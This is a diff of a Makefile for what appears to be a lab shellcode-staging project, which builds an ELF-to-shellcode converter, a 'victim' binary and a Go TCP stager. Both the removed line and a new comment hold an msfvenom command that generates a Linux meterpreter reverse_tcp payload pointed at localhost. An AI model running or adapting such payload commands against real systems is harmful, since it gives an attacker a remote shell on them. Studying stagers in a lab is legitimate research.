@@ -1,19 +1,31 @@
 LHOST=127.0.0.1
 
+CC=gcc
+
+.PHONY: elf2bin shellcode.elf victim.elf
+
 all: convert2bin victim.elf
 all: tcp-stager
 
 elf2bin:
-	$(cc) -o elf2bin elf2bin/elf2bin.c elf2bin/elf.h  elf2bin/util-common.h
+	$(CC) -o elf2bin elf2bin-src/elf2bin.c elf2bin-src/elf.h  elf2bin-src/util-common.h
 
-smaple:
-	GOOS=linux GOARCH=amd64 go build -buildmode=PIE -static -o sample.elf example/
+shellcode.elf:
+	cd ./example && make && mv ./shellcode.elf ../
+	file shellcode.elf 
 
-convert2bin: elf2bin sample
-	./elf2bin sample.elf shellcode.elf
+convert2bin: elf2bin shellcode.elf
+	./elf2bin shellcode.elf shellcode.elf.bin
+	mv shellcode.elf.bin shellcode.elf
 
 tcp-stager:
+	clear
 	go run main.go
 
 victim.elf:
-	msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$(LHOST) LPORT=4444 -f elf -o victim.elf
+	# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o victim.elf && chmod +x victim.elf
+	cd ./victim && make && mv ./victim.elf ../
+	file victim.elf
+
+run-victim: victim.elf
+	strace ./victim.elf
